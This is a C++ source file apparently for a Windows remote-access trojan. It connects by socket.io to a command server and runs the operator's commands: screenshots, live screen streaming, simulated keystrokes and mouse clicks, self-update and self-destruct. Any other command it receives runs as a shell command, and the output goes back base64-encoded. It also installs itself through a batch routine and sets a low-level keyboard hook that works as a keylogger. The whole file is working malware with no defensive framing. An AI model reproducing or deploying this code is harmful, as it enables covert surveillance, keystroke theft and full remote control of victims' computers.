#include "Emmet.h"

int main(int argc, char* argv[])
{
    if(argc > 1)
    {
        std::string path = argv[0];
        std::size_t last_slash = path.find_last_of("\\");
        std::string fileName = path.substr(last_slash + 1);

        std::thread installEmmet(InstallEmmetBat, path);
        installEmmet.join();

        SelfDestruct(fileName, path);
    }

    //HideWindow();
    ShowWindow(GetConsoleWindow(), SW_RESTORE);
    std::thread checker(Checker);
    std::thread live(GoLive);

    std::string message = VERSION;

    client.set_reconnecting_listener([&]()
    {
        connected = false;
    });

    client.set_open_listener([&]()
    {
        client.socket()->emit("join", message);
        connected = true;
    });

    client.socket()->on("delay", [&](sio::event& ev)
    {
        liveDelay = ev.get_message()->get_int();
    });

    client.socket()->on("command", [&](sio::event& ev)
    {      
        std::string message = ev.get_message()->get_string();
        if (message == "screenshot")
            Screenshot();
        else if (message == "livestart")
            isLive = true;
        else if (message == "livestop")
            isLive = false;
        else if (message == "live")
            isLive = !isLive;
        else if (message.find("press") != std::string::npos)
        {
            std::vector<std::string> words;
            std::size_t pos = 0;
            std::string word;

            while ((pos = message.find(" ")) != std::string::npos) {
                word = message.substr(0, pos);
                words.push_back(word);
                message.erase(0, pos + 1);
            }
            words.push_back(message);

            try
            {
                if (words.size() == 2)
                {
                    std::cout << toUpper(words[1]) << std::endl;
                    PressKey(toUpper(words[1]));
                }
                else
                    client.socket()->emit("commandResult", Base64Encode("Something went wrong"));
            }
            catch (const std::invalid_argument& e)
            {
                client.socket()->emit("commandResult", Base64Encode("Something went wrong"));
            }
            catch (const std::out_of_range& e)
            {
                client.socket()->emit("commandResult", Base64Encode("Something went wrong"));
            }
        }
        else if (message.find("click") != std::string::npos)
        {
            std::vector<std::string> words;
            std::size_t pos = 0;
            std::string word;

            while ((pos = message.find(" ")) != std::string::npos) {
                word = message.substr(0, pos);
                words.push_back(word);
                message.erase(0, pos + 1);
            }
            words.push_back(message);

            try
            {
                if(words.size() >= 3)
                    ClickAtPosition(std::stoi(words[1]), std::stoi(words[2]));
                else
                    client.socket()->emit("commandResult", Base64Encode("Something went wrong"));
            }
            catch(const std::invalid_argument& e)
            {
                client.socket()->emit("commandResult", Base64Encode("Something went wrong"));
            }
            catch (const std::out_of_range& e)
            {
                client.socket()->emit("commandResult", Base64Encode("Something went wrong"));
            }
        }
        else if (message == "destroy")
        {
            std::string path = argv[0];
            std::size_t last_slash = path.find_last_of("\\");
            std::string processName = path.substr(last_slash + 1);

            SelfDestruct(processName, path);
        }
        else if (message == "update")
        {
            //Get .exe name only
            std::string path = argv[0];
            std::size_t last_slash = path.find_last_of("\\");
            std::string actualNameOfFile = path.substr(last_slash + 1);

            std::string dir = std::filesystem::path(argv[0]).parent_path().string();

            client.socket()->emit("commandResult", Base64Encode(std::string("Update has been started.")));
            Update(actualNameOfFile, dir);
        }
        else
        {
            std::string command = ev.get_message()->get_string();

            FILE* pipe = _popen(command.c_str(), "r");
            if (pipe == NULL) {
                std::cout << "Can't open the pipe" << std::endl;
            }

            std::string result;
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
                result += buffer;
            }

            _pclose(pipe);
            
            client.socket()->emit("commandResult", Base64Encode(result));
        }
    });

    if (!connected)
        client.connect(server);

    HHOOK hKeyHook;
    HINSTANCE hExe = GetModuleHandle(NULL);
    if (hExe == NULL)
    {
        return 1;
    }
    else
    {
        hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)GetKeyBoard, hExe, 0);
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) != 0)
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(hKeyHook);
    }
}